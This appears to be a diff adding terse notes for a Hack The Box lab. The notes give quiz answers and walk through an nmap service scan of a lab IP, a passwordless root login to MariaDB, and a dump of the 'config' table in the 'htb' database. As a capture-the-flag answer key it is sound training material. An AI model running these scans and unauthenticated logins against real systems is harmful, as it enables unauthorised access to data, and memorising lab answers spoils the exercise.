@@ -1,0 +1,12 @@
+Structured Query Language
+3306
+nmap -sVC 10.129.154.95 -p 3306 -> MariaDB
+-u
+root
+*
+;
+mysql -u root -h 10.129.154.95
+SHOW DATABASES;
+USE htb;
+SHOW TABLES
+SELECT * FROM config;
